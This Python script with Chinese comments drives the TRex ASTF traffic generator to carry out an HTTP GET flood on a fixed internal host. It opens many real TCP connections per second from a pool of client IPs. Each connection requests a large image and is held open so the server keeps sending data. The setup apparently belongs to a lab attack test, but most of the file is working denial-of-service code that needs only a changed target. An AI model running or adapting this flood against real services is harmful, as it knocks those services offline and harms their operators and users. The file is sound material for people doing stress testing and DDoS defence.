#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ASTF HTTP GET flood（大文件下载攻击）

每个连接都完成真实三次握手，然后发送 GET 图片请求并保持连接
（dwell 期间服务器持续传输大文件），以 cps 速率不断新建连接，
消耗目标服务器的连接/带宽资源。

用法（客户端机器，conda trex311）：
  cd ~/fzx/Attack-test/scripts
  PYTHONPATH=/root/fzx/Trex_Scripts/v3.08/automation/trex_control_plane/interactive \
    python3 astf_get_flood.py --cps 50 --duration 30

参数：
  --cps        每秒新建连接数（默认 50）
  --duration   攻击时长秒（默认 30，TRex start 会阻塞到结束）
  --client-ips 客户端 IP 池 "起-止"（默认 100.1.11.200-100.1.11.209）
  --dwell      每个连接保持/下载时长 ms（默认 15000，内部 ×1000 转 usec）
  --server / --sync / --async   TRex daemon 地址与端口
"""
import argparse
import sys
import tempfile
import time

from trex.astf.api import ASTFClient

SERVER = "10.99.80.222"
SYNC = 4501
ASYNC = 4500
PORT = 0
TARGET = "100.1.11.3"
DPORT = 8081
GATEWAY_MAC = "f4:e9:75:ee:51:69"   # 网关 MAC（STL 时代验证可达目标）
IMAGE_PATH = "/api/activities/00000000-0000-0000-0000-000000000001/image"

PROFILE_SRC = '''\
from trex.astf.api import *

CLIENT_RANGE = ["__IP_A__", "__IP_B__"]
TARGET = "__TARGET__"
DPORT = __DPORT__
CPS = __CPS__
DWELL = __DWELL__

HTTP_REQ = (
    "GET __IMAGE_PATH__ HTTP/1.1\\r\\n"
    "Host: __TARGET__:__DPORT__\\r\\n"
    "Connection: close\\r\\n"
    "User-Agent: trex-astf-flood/1.0\\r\\n"
    "\\r\\n"
).encode()


class ProfGetFlood():
    def get_profile(self, **kwargs):
        # 客户端：握手 → GET → 收首字节 → 保持连接（服务器持续传输）→ 关闭
        prog_c = ASTFProgram()
        prog_c.connect()
        prog_c.send(HTTP_REQ)
        prog_c.recv(1, 10000)       # 收首字节；第 2 参是 clear（bool）不是超时（truthy→True）
        prog_c.delay(DWELL * 1000)  # DWELL 单位 ms；delay 单位 usec，×1000 转微秒
        prog_c.reset()

        # 服务端占位（打真实服务器时不使用）
        prog_s = ASTFProgram()
        prog_s.accept()
        prog_s.recv(1)
        prog_s.send(b"HTTP/1.1 200 OK\\r\\nContent-Length: 2\\r\\n\\r\\nok")
        prog_s.delay(1000)

        ip_gen_c = ASTFIPGenDist(ip_range=CLIENT_RANGE, distribution="seq")
        ip_gen_s = ASTFIPGenDist(ip_range=[TARGET, TARGET], distribution="seq")
        ip_gen = ASTFIPGen(glob=ASTFIPGenGlobal(ip_offset="0.0.0.0"),
                           dist_client=ip_gen_c,
                           dist_server=ip_gen_s)

        temp_c = ASTFTCPClientTemplate(ip_gen=ip_gen, port=DPORT,
                                       program=prog_c, cps=CPS, cont=True)
        temp_s = ASTFTCPServerTemplate(program=prog_s)
        template = ASTFTemplate(client_template=temp_c, server_template=temp_s)

        return ASTFProfile(default_ip_gen=ip_gen, templates=[template])


def register():
    return ProfGetFlood()
'''


def build_profile_source(ip_a, ip_b, cps, dwell) -> str:
    return (PROFILE_SRC
            .replace("__IP_A__", ip_a)
            .replace("__IP_B__", ip_b)
            .replace("__TARGET__", TARGET)
            .replace("__DPORT__", str(DPORT))
            .replace("__CPS__", str(cps))
            .replace("__DWELL__", str(dwell))
            .replace("__IMAGE_PATH__", IMAGE_PATH))


def configure_port(c) -> None:
    """端口配置（同 astf_verify）：set_l3_mode，ARP 不通退回 L2 固定网关 MAC。"""
    try:
        c.set_service_mode(ports=[PORT], enabled=True)
        try:
            c.set_l3_mode(PORT, "100.1.11.200", TARGET)
        except Exception as e:
            print("⚠️  set_l3_mode 异常（可能已生效但 ARP 未解）:", e)
        resolved = False
        try:
            c.resolve(ports=[PORT], retries=3)
            resolved = True
        except Exception as e:
            print("⚠️  ARP 解析失败（与 STL 时代一致）:", e)
        if not resolved and hasattr(c, "set_l2_mode"):
            try:
                try:
                    c.set_l2_mode(PORT, dst_mac=GATEWAY_MAC)
                except TypeError:
                    c.set_l2_mode(PORT, GATEWAY_MAC)
                print(f"✅ 退回 L2 模式：出口 MAC 固定为网关 {GATEWAY_MAC}")
            except Exception as e:
                print("⚠️  set_l2_mode 失败:", e)
        try:
            c.set_service_mode(ports=[PORT], enabled=False)
        except Exception:
            pass
    except Exception as e:
        print("⚠️  set_service_mode 失败:", e)


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--cps", type=int, default=50)
    ap.add_argument("--duration", type=int, default=30)
    ap.add_argument("--client-ips", default="100.1.11.200-100.1.11.209")
    ap.add_argument("--dwell", type=int, default=15000)
    ap.add_argument("--server", default=SERVER)
    ap.add_argument("--sync", type=int, default=SYNC)
    ap.add_argument("--async-port", type=int, default=ASYNC)
    args = ap.parse_args()

    ip_a, _, ip_b = args.client_ips.partition("-")
    if not ip_b:
        ip_b = ip_a

    c = ASTFClient(server=args.server, sync_port=args.sync, async_port=args.async_port)
    try:
        c.connect()
    except Exception as e:
        print("❌ 连不上 ASTF daemon:", e)
        sys.exit(1)
    print("✅ 已连接 ASTF daemon")

    try:
        c.acquire(force=True)
        c.reset()
    except Exception as e:
        print("❌ acquire/reset 失败:", e)
        sys.exit(1)

    configure_port(c)

    with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False) as f:
        f.write(build_profile_source(ip_a, ip_b, args.cps, args.dwell))
        prof_path = f.name
    try:
        pid = c.load_profile(prof_path)
        pid = pid or ""
        print(f"✅ load_profile 成功（pid={pid!r}），cps={args.cps}, "
              f"IP 池 {ip_a}~{ip_b}, dwell={args.dwell}ms, duration={args.duration}s")
    except Exception as e:
        print("❌ load_profile 失败:", e)
        sys.exit(1)

    print(f"▶ 开始 GET flood：{ip_a}~{ip_b} → {TARGET}:{DPORT}")
    t0 = time.time()
    try:
        # 不依赖 block 语义：非阻塞启动 + 自己控制时长
        try:
            c.start(pid_input=pid, mult=1, duration=args.duration, block=False)
        except Exception:
            c.start(pid_input="_", mult=1, duration=args.duration, block=False)
    except Exception as e:
        print("❌ start 失败:", e)
        sys.exit(1)

    deadline = time.time() + args.duration
    while time.time() < deadline:
        time.sleep(min(10, deadline - time.time()))
        s = c.get_stats().get(PORT, {})
        print(f"  [t+{time.time() - t0:.0f}s] tx={s.get('opackets', 0)} 包, "
              f"rx={s.get('ipackets', 0)} 包")
    c.stop()
    elapsed = time.time() - t0

    stats = c.get_stats()
    ps = stats.get(PORT, {})
    tx_pkts = ps.get("opackets", 0)
    rx_pkts = ps.get("ipackets", 0)
    tx_bytes = ps.get("obytes", 0)
    rx_bytes = ps.get("ibytes", 0)
    print(f"▶ 结束（{elapsed:.1f}s）：tx={tx_pkts} 包 / {tx_bytes/1e6:.1f} MB，"
          f"rx={rx_pkts} 包 / {rx_bytes/1e6:.1f} MB")
    if rx_bytes > 0:
        print(f"🎉 服务器实际回传 {rx_bytes/1e6:.2f} MB——连接与下载链路正常")
    else:
        print("⚠️  rx=0，服务器无回包")

    c.stop()
    c.release()
    c.disconnect()
    print("done")


if __name__ == "__main__":
    main()
